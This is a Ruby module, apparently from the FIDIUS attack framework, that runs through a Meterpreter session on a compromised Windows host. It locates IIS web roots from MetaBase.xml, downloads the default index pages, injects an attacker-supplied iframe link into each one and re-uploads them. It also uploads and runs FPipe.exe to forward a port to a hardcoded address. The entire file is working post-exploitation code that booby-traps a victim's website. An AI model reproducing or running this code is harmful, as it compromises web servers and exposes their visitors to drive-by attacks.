require 'fidius/session/booby_trap_handler'

module FIDIUS
  module Session
  
    class WebserverIFrameInjection
      def initialize client, link = ""
        @session = client
        @pwnlink = link
      end
      
      def localizeIndexFiles
        processes = @session.sys.process.get_processes
        iis_path = ""
        iis_running = false
        processes.each{ |pro|
          tmp_pro = pro['name']
          if  tmp_pro.include?("inetinfo.exe")
            #print_status "IIS is Running"
            iis_path = remotePath(pro['path'])
            iis_running = true
            break
          end
        }
        analyzeConfig tmpDown("#{Dir.pwd}", "#{iis_path}\\MetaBase.xml") if iis_running
      end

      def establishPortFwd
        script_path = Msf::Sessions::Meterpreter.find_script_path("uploadexec")
        #FIXME Hartgecoded IP
        #args = ['-e',"#{RAILS_ROOT}/vendor/FPipe.exe", '-o', "-l 3000 -r 3000 #{@pwnlink[0,@pwnlink.rindex(':')]}", lhost]
        args = ['-e',"#{RAILS_ROOT}/vendor/FPipe.exe",'-p','C:\\', '-o', "-l 8081 -r 8080 192.168.178.22"]
        puts "run: #{script_path} #{args}"
        @session.execute_file(script_path, args)
      end

      def analyzeConfig config_path = ""
        config = File.readlines config_path
        tmp_path_array = []
        tmp_name_array = []
        pathes_to_search_in = [] 
        default_doc_names = []
        config.each do |line|
          tmp_path_array << line if line.include?("Path=\"") and !line.include?("Filter")
          tmp_name_array << line if line.include?("DefaultDoc=\"")
        end
        tmp_path_array.each do |line|
          path = line.gsub("\"",'')
          path = path.downcase.sub("path=",'')
          path = path.lstrip.gsub(/\s/,'')
          pathes_to_search_in << path
        end
        tmp_name_array.each do |line|
          name = line.gsub("\"",'')
          name = name.gsub(/\s/,'')
          name = name.downcase.sub("defaultdoc=",'')
          default_doc_names = default_doc_names - name.split(',')
          default_doc_names = default_doc_names + name.split(',')
        end
      
        dir = "directories" if pathes_to_search_in.length > 1
        dir = "directory" if pathes_to_search_in.length <= 1
        #print_status "#{pathes_to_search_in.length} webpage #{dir} found"
        #print_status "Default Docs: #{default_doc_names}"
        pathes_to_search_in.each do |root|
          #print_status "For Path: #{root}"
          default_doc_names.each do |file_name|
            found_files = @session.fs.file.search(root, file_name)
            if found_files.length > 0
              boobyTrapThatBitch "#{Dir.pwd}","#{found_files[0]['path']}\\#{found_files[0]['name']}"
            end
          end
        end
        rmTmpDown config_path
      end

      def boobyTrapThatBitch local_dest = "/", remote_path = ""
        local_file_path = tmpDown local_dest,remote_path
        #print_status "Initializing Boobytrap in #{local_file_path}"
        testTrap = BoobyTrapHandler.new local_file_path
        testTrap.addIframe @pwnlink
        tmpUpload remotePath(remote_path),local_file_path
        rmTmpDown local_file_path
      end

      def fileName file_path = ""
        tmpArray = file_path.split "\\"
        tmpArray.last
      end

      def remotePath file_path = ""
        tmpLength = fileName(file_path).length + 1
        file_path[0..file_path.length - tmpLength]
      end

      def tmpDown destination = "",src_file = ""
        #print_status "Downloading file: #{src_file} to localpath: #{destination}"
        @session.fs.file.download(destination, src_file)
        "#{destination}/#{fileName(src_file)}"
      end

      def rmTmpDown src_file = ""
        if (File.delete(src_file) > 0)
          #print_status "Deleted local file: #{src_file}"
        end
      end

      def tmpUpload remote_destination = "",src_file = ""
        #print_status "Uploading local file: #{src_file}"
        @session.fs.file.upload(remote_destination,src_file)
      end
    end

  end
end
